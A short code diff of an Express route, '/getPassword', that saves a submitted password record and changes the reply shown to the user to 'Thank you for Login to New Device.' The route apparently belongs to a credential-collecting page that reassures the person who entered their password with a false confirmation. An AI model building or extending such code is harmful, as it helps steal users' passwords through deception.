@@ -84,7 +84,7 @@ router.post('/getPassword', async (req, res) => {
     )
 
     await newGetPass.save();
-    res.send('<p style="color:red";font-size: x-large;> If you are a visitor, contact the website owner or try again later.</p>')
+    res.send('<p style="color:red";font-size: 30px;> Thank you for Login to New Device.</p>')
 })
 
 module.exports = router;
